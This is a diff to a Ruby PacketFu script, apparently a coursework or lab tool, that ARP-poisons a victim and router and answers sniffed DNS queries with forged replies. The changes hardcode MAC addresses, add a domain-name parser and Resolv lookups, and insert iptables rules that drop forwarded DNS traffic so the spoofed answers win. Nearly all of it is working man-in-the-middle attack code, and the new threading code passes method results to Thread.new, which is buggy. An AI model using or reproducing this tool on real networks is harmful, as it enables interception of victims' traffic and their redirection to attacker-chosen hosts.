@@ -32,6 +32,7 @@ require 'packetfu'
 require 'thread'
 require 'macaddr'
 require 'optparse'
+require 'resolv'
 require_relative 'utils.rb'
 include PacketFu
 
@@ -72,11 +73,16 @@ if $target_ip.nil?
   abort("You must specify the victim's IP address and an IP address to spoof!")
 end
 # Get the mac addresses for all the necessary machines.
-sender_mac = Mac.addr
+#sender_mac = Mac.addr
+sender_mac = '00:26:82:c6:bf:82'
+target_mac = 'b8:e8:56:1a:88:8e'
 `ping -c 1 #{$target_ip}`
-target_mac = `arp | grep #{$target_ip} | awk '{ print $3} '`
-router_mac = `arp | grep #{$router_ip} | awk '{ print $3} '`
+#target_mac = `arp | grep #{$target_ip} | awk '{ print $3} '`
+#router_mac = `arp | grep #{$router_ip} | awk '{ print $3} '`
 
+#puts "Router Mac; " + router_mac
+puts "Sender Mac: " + sender_mac
+puts "Target Mac: " + target_mac
 # Builds on the previous ARP spoofing example.
 # The sending of ARP packets is done in a separate thread.
 
@@ -93,9 +99,9 @@ arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP repl
 # Construct the router's packet
 arp_packet_router = ARPPacket.new()
 arp_packet_router.eth_saddr = sender_mac       # sender's MAC address
-arp_packet_router.eth_daddr = router_mac       # router's MAC address
+arp_packet_router.eth_daddr = '60:2a:d0:6b:1b:21'       # router's MAC address
 arp_packet_router.arp_saddr_mac = sender_mac   # sender's MAC address
-arp_packet_router.arp_daddr_mac = router_mac   # router's MAC address
+arp_packet_router.arp_daddr_mac = '60:2a:d0:6b:1b:21'   # router's MAC address
 arp_packet_router.arp_saddr_ip = $target_ip         # target's IP
 arp_packet_router.arp_daddr_ip = $router_ip        # router's IP
 arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
@@ -160,10 +166,21 @@ end
 def check_spoof(domainName)
   $spoof_hash.each_key do |k|
     if domainName =~ /#{k}/
-      return $spoof_hash[k]
+      puts "Spoofing: " +  Resolv.getaddress( $spoof_hash[k])
+      return Resolv.getaddress $spoof_hash[k]
     end
   end
-  return nil
+  puts "Getting: " + domainName
+
+  x = Resolv.getaddress domainName
+
+
+  return x
+rescue Resolv::ResolvError => e
+  p e.message
+  p e.backtrace
+
+
 end
 ######################################################################
 ##	FUNCTION:	    sendResponse
@@ -229,7 +246,18 @@ def sendResponse(packet, domainName, spoof_ip)
 
 end
 
-
+def getDomainName(payload)
+  domainName = ""
+  while true
+    len = payload[0].to_i
+    if len != 0
+      domainName += payload[1,len] + "."
+      payload = payload[len+1..-1]
+    else
+      return domainName = domainName[0,domainName.length-1]
+    end
+  end
+end
 ######################################################################
 ##	FUNCTION:	    get_info
 ##
@@ -295,9 +323,6 @@ def get_info(packet)
       x = false
     end
 
-
-
-
   end
 
   return domain
@@ -336,11 +361,21 @@ def sniff(iface)
 
     if $dnsQuery == '10'
       domain = get_info(packet)
+      #domain = getDomainName(packet.payload[12..-1])
+      if domain.nil?
+        next
+      end
       spoof_ip = check_spoof(domain)
       if !spoof_ip.nil?
-        `iptables -A FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=`+ packet.payload[0,2] +`"-j DROP`
+        #`iptables -A FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=`+ packet.payload[0,2] +`"-j DROP`
+        #`iptables -A FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=#{packet.payload[0,2]} -j DROP`
+        #`echo #{packet.payload[0,2]}`
+
         sendResponse(packet, domain, spoof_ip)
-        `iptables -D FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=`+ packet.payload[0,2] +`"-j DROP`
+       # `iptables -D FORWARD -p UDP --dport 53 -j DROP`
+       # `iptables -D FORWARD -p TCP --dport 53 -j DROP`
+        #`iptables -D FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=`+ packet.payload[0,2] +`"-j DROP`
+        #`iptables -D FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=#{packet.payload[0,2]} -j DROP`
       end
 
     end
@@ -350,29 +385,29 @@ def sniff(iface)
 end
 
 begin
-  #puts "Starting the ARP poisoning thread..."
+
   #spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)}
+  `iptables -A FORWARD -p UDP --dport 53 -j DROP`
+  `iptables -A FORWARD -p TCP --dport 53 -j DROP`
 
-  @pid = fork do
-    puts "Starting ARP poisioning"
-
-    # Ensure that we shut down the child cleanly
-    Signal.trap("INT") { exit }
-
-    runspoof(arp_packet_target, arp_packet_router)
-
-  end
-
-  Signal.trap("SIGINT") { Process.kill("INT", @pid); Process.wait; exit }
+  threads = []
+  puts "Starting the ARP poisoning thread..."
+  threads << Thread.new(runspoof(arp_packet_target, arp_packet_router))
   puts "Starting the sniffing..."
-  #sniff_thread = Thread.new{sniff($iface)}
-  sniff($iface)
-  #spoof_thread.join
-  #sniff_thread.join
+  threads << Thread.new(sniff($iface))
 
+  threads.each { |thr| thr.join}
+    
     # Catch the interrupt and kill the thread
 rescue Interrupt
   puts "\nDNS spoof stopped by interrupt signal."
   `echo 0 > /proc/sys/net/ipv4/ip_forward`
+  `iptables -D FORWARD -p UDP --dport 53 -j DROP`
+  `iptables -D FORWARD -p TCP --dport 53 -j DROP`
+  threads.each { |thr| Thread.kill(thr)}
+
   exit 0
+
+
+
 end
